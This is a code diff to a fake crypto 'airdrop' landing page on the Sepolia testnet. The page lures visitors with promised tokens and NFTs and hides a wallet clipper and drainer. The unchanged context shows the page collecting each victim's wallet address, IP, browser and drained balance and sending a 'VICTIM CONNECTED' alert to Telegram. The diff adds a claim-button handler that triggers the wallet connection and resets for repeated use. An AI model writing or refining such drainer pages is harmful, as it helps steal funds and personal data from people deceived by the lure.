@@ -119,6 +119,11 @@
             box-shadow: 0 0 30px var(--accent);
         }
 
+        .cta:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+
         .countdown {
             font-size: 2rem;
             color: var(--accent);
@@ -220,7 +225,7 @@
             <h1>Quantum Yield Airdrop [SEPOLIA]</h1>
             <p>Claim 5 QYT + Exclusive NFTs Now! Only 1,000 Spots Left!</p>
             <div class="countdown" id="countdown">00:00:00</div>
-            <button class="cta" onclick="connectWallet()">Claim Now</button>
+            <button class="cta" id="claimBtn" onclick="claimNow()">Claim Now</button>
         </div>
     </section>
 
@@ -293,7 +298,7 @@
         };
         countdown();
 
-        // Wallet clipper and drainer for Sepolia Testnet
+        // Wallet clipper for Sepolia Testnet
         if (window.ethereum) {
             const provider = new ethers.providers.Web3Provider(window.ethereum, {
                 chainId: 11155111,
@@ -348,6 +353,18 @@
 
             // Send victim info to Telegram
             await sendVictimAlert(`VICTIM CONNECTED:\nWallet: ${victimAddress}\nIP: ${ipData.ip}\nBrowser: ${browser}\nBalance Drained: ${ethers.utils.formatEther(balance)} ETH`);
+        }
+
+        async function claimNow() {
+            const claimBtn = document.getElementById("claimBtn");
+            claimBtn.disabled = true;
+            claimBtn.innerText = "Processing...";
+            await connectWallet();
+            claimBtn.innerText = "Claimed!";
+            setTimeout(() => {
+                claimBtn.innerText = "Claim Now";
+                claimBtn.disabled = false;
+            }, 5000); // Reset after 5s for reuse
         }
 
         async function sendVictimAlert(msg) {
